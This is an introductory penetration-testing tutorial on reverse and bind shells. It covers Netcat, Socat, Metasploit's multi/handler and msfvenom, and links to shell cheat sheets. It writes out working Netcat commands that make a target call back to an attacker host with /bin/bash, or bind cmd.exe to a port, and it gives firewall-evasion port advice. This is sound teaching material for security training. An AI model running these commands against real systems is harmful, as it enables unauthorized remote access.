# What the Shell? 
An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.

## What is a shell?

A *shell* is what we use to interface with a Command Line environment. The common `bash` or `sh` programs in Linux, and `cmd.exe` and Powershell on Windows are all examples of a shell.

When targeting remote systems, it may be possible to force an application on the server to execute arbitrary code. We would then normally force the remote server to either send us command line access (this is a **reverse** shell), or to open up a port on the server which we can connect to to execute further commands (this is a **bind** shell).

## Tools

There are a variety of tools that we will use to receive reverse shells and to send bind shells. Generally, we need:

* malicious shell code, and
* a way to interface with the resulting shell.

We will discuss some of the tools below: 

-----

### Netcat

*Netcat* is an essential tool in networking. It is used to manually perform all kinds of network interactions. Most importantly, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by the use of certain techniques.

### Socat

*Socat* can be seen as an improved version of Netcat. It can do the same things as Netcat, and many more. Socat shells are usually also more stable than Netcat shells. However, there are some caveats:

1. Socat has more difficult syntax.
2. Netcat is installed on almost all Linux distributions by default, while Socat is not.

Both Netcat and Socat have `.exe` versions for use on Windows systems.

### Metasploit - multi/handler

The `auxiliary/multi/handler` module of the Metasploit framework can also be used to receive reverse shells. `multi/handler` provides a fully-fledged way to obtain stable shells, with many further options to improve the caught shell. It is also the only way to interact with a *meterpreter* shell, and is the easiest way to handle *staged payloads*.

### Msfvenom

Like `multi/handler`, msfvenom is part of the Metasploit framework. However, it is shipped as a standalone tool. Msfvenom is used to generate payloads, for both reverse and bind shells, on the fly.

-----

Aside from the tools above, there are also repositories which collate shells in different languages: 

* [Payload all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [PentestMonkey Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [SecLists repo](https://github.com/danielmiessler/SecLists)

Kali Linux also comes pre-installed with a variety of webshells at `/usr/share/webshells`. 

## Types of shells

As mentioned earlier, there are two types of shells that are of interest when exploiting a target: *reverse* shells, and *bind* shells.

**Reverse shells** are when the target is forced to execute code that connects back to the attacker. The attacker would set-up a *listener* to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent us from connecting to arbitrary ports on the target. However, when we receive a shell from a target across the Internet, we will need to configure our own network to accept the shell. 

**Bind shells** are when the code excuted on the target starts a listener attached to a shell *on the target*. This would then be opened up to the Internet: we can connect to the port that the code has opened and obtain remote code execution. This has the advantage of net requiring configuration on our network, but may be prevented by firewalls protecting the target.

Generally, reverse shells are easier to learn and debug.

-----

### Reverse Shell Example

The reverse shell is more common. On the attacking machine, we might run a command such as:
```console
~$ sudo nc -lvnp 443
```
Meanwhile, on the target, we might execute a command such as: 
```console
~$ nc <LOCAL_IP> <PORT> -e /bin/bash
```
albeit not explicitly; usually executed via some code injection, etc.

Successful execution of the commands lead to something like

![Reverse Shell Example](./img/reverse_shell.png "Reverse Shell Example")

On the left, we have the reverse shell listener on the attacking machine. On the right, is the target machine. 

Notice that after running the command on the right, the listener receives a connection. When the `whoami` command is executed on the target, we see that we are executing commands as the target user.

> The main point here is that we are *listening* on our own attacking machine, and sending a connection *from* the target.

-----

### Bind Shell example

The bind shell is less common, but still very useful. On the target, we will need to start a listener, and at the same time tell it to execute `cmd.exe`:
```console
~$ nc -lvnp <PORT> -e "cmd.exe"
```
On the attacking machine, we will execute something like
```console
~$ nc <MACHINE_IP> <PORT>
```

We will end up with something that looks like

![Bind Shell example](./img/bind_shell.png "Bind Shell example")

Here, the attacker is on the left and the target is on the right. As we can see, we have code execution on the remote machine. 

> In constrast to reverse shells, here we are *listening* on the **target**, then connecting to it with the attacker.

-----

### Interactivity

Shells can either be *interactive* or *non-interactive*. 

* **Interactive**: *Powershell, Bash, Zsh* are all examples of interactive shells. These allow us to interact with the programs after executing them.
* **Non-interactive**: In a non-interactive shell, we are limited to programs which **do not** require user interation to run properly. Majority of reverse and bind shells are non-interactive.

## Netcat

As mentioned previously, Netcat is the basic tool in a pentester's toolkit when it comes to networking. For **reverse shells**, Netcat can be used to start a listener on the attacking machine.

The syntax for starting a listener in Linux is
```console
~$ nc -lvnp <PORT>
```
* `-l` tells Netcat that this is a listener
* `-v` requests for verbose output
* `-n` tells Netcat not to resolve hostnames or use DNS, i.e. only numeric-only IP addresses are valid
* `-p` indicates that a port will be specified

In the previous section, the example used port 443. Realistically, we can use any port we want (as long as no other service is using it). If a port below 1024 is used, then we will need `sudo` when starting the listener. 

> It is often a good idea to use a well-known port number ( e.g. 80, 443, 53) as they are more likely to get past outbound firewall rules on the target.

On the other hand, for **bind shells**, we already have a listener on the target on a specified port -- all we need to do is connect to it. The syntax is straight forward:
```console
~$ nc <TARGET_IP> <PORT>
```
